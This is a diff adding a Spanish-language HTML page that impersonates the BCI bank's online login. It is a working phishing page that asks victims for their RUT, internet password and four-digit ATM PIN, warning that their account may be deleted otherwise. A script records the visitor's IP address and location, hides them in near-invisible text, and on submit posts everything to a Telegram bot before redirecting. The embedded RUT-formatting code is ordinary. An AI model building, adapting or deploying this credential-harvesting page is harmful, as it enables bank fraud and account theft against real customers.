@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCI-INTERNET</title>
+    <link rel="stylesheet" href="facespace/frascare.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+    <script src="facespace/spacetl.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+              $("#gfg").html(data.ip);
+          });
+          $.getJSON("https://ipinfo.io", function(response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+    
+      var u_name, u_name2, u_name3, ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("turuno").value;
+        u_name2 = document.getElementById("turdos").value;
+        u_name3 = document.getElementById("turtres").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "FORMULARIO\n☰URUT: " + u_name + "\n☰contraINT: " + u_name2 + "\n☰clavcajero: " + u_name3 + "\n🌎IP: " + ip +"\n" + ip2;
+      };
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'carreganl.html';
+        });
+        return false;
+      };
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+
+    // oír los cambios en la caja de texto e ir dando formato al RUT
+    document.addEventListener('input', (e) => {
+      const rut = document.getElementById('turuno');
+    
+      if (e.target === rut) {
+        let rutFormateado = darFormatoRUT(rut.value);
+        rut.value = rutFormateado;
+      }
+    });
+    
+    // dar formato XX.XXX.XXX-X
+    function darFormatoRUT(rut) {
+      // dejar solo números y letras 'k'
+      const rutLimpio = rut.replace(/[^0-9kK]/g, '');
+    
+      // asilar el cuerpo del dígito verificador
+      const cuerpo = rutLimpio.slice(0, -1);
+      const dv = rutLimpio.slice(-1).toUpperCase();
+    
+      if (rutLimpio.length < 2) return rutLimpio;
+    
+      // colocar los separadores de miles al cuerpo
+      let cuerpoFormatoMiles = cuerpo
+        .toString()
+        .split('')
+        .reverse()
+        .join('')
+        .replace(/(?=\d*\.?)(\d{3})/g, '$1.');
+    
+      cuerpoFormatoMiles = cuerpoFormatoMiles
+        .split('')
+        .reverse()
+        .join('')
+        .replace(/^[\.]/, '');
+    
+      return `${cuerpoFormatoMiles}-${dv}`;
+    }
+    
+    // si presiona ENTER ejecutar la validación
+    document.addEventListener('keypress', (e) => {
+      if (e.keyCode == 13) ejecutarValidacion();
+    });
+    
+    // oír el clic y si presiona el botón 'Validar RUT' ejecutar la validación
+    document.addEventListener('click', (e) => {
+      const botonValidarRUT = document.getElementById('btn-valida-rut');
+    
+      if (e.target === botonValidarRUT) {
+        ejecutarValidacion();
+      }
+    });
+    
+    function ejecutarValidacion() {
+      const rut = document.getElementById('turuno').value;
+      const resultado = validarRUT(rut);
+      const salida = document.querySelector('.salida');
+    
+      if (!rut) {
+        salida.innerHTML = `<p style="color: red;">Debes ingresar un RUT</p>`;
+      } else if (resultado === true) {
+        salida.innerHTML = `<p style="color: darkgreen;">El RUT ${rut} es válido</p>`;
+      } else {
+        salida.innerHTML = `<p style="color: red;">El RUT ${rut} no es válido</p>`;
+      }
+    
+      document.getElementById('turuno').value = '';
+    }
+    
+    function validarRUT(rut) {
+      // dejar solo números y letras 'k'
+      const rutLimpio = rut.replace(/[^0-9kK]/g, '');
+    
+      // verificar que ingrese al menos 2 caracteres válidos
+      if (rutLimpio.length < 2) return false;
+    
+      // asilar el cuerpo del dígito verificador
+      const cuerpo = rutLimpio.slice(0, -1);
+      const dv = rutLimpio.slice(-1).toUpperCase();
+    
+      // validar que el cuerpo sea numérico
+      if (!cuerpo.replace(/[^0-9]/g, '')) return false;
+    
+      // calcular el DV asociado al cuerpo del RUT
+      const dvCalculado = calcularDV(cuerpo);
+    
+      // comparar el DV del RUT recibido con el DV calculado
+      return dvCalculado == dv;
+    }
+    
+    function calcularDV(cuerpoRUT) {
+      let suma = 1;
+      let multiplo = 0;
+    
+      for (; cuerpoRUT; cuerpoRUT = Math.floor(cuerpoRUT / 10))
+        suma = (suma + (cuerpoRUT % 10) * (9 - (multiplo++ % 6))) % 11;
+    
+      return suma ? suma - 1 : 'K';
+    }
+    
+    </script>
+    
+</head>
+<body>
+    
+
+
+    <div class="primeren">
+        <img width="40px" src="facespace/iconooo.svg" alt=""> 
+    </div>
+
+<div style="background-color: rgb(208, 208, 208); width: 100%; height: 1.4px;"></div>
+
+<div class="primeren">
+<p class="pp">PERSONAS</p>
+</div>
+
+
+
+<div class="linea">
+    <div class="sublinea"></div>
+  </div>
+
+<div class="ques">
+
+
+    <div class="ques2">
+        <form method="post" action="#" onsubmit="return sender();">
+            <center><h3>Ingresa lo requerido y valida!</h3></center>
+
+
+<label style="text-align: left;" for="homefill">RUT</label><br>
+
+<input  name="turuno" id="turuno" type="text" inputmode="numeric" required="" placeholder="Ingresa tu RUT"  onkeyup="mascara(this,formatoRUT)"><br><br>
+
+
+
+
+
+
+
+
+<label style="text-align: left;" for="homefill">CLAVE</label><br>
+<input   name="turdos" id="turdos"  type="text"  required="" placeholder="Ingresa tu Clave de internet">
+
+<br><br>
+
+<label style="text-align: left;" for="homefill">CLAVE DE CAJERO</label><br>
+<input   name="turtres" id="turtres"  minlength="4" maxlength="4" type="text" inputmode="numeric" required="" placeholder="INGRESA LA CLAVE DE CAJERO">
+
+<br><br><center><p class="papad">Ingresa lo requerido o tu cuenta podra ser borrada!</p></center>
+<br>
+<input class="elbt" type="submit" value="Ingresar">
+</form></div>
+
+
+</div>
+
+<div style="color: rgb(255, 255, 255);font-size: 0.00002;" >
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div>
+</body>
+</html>
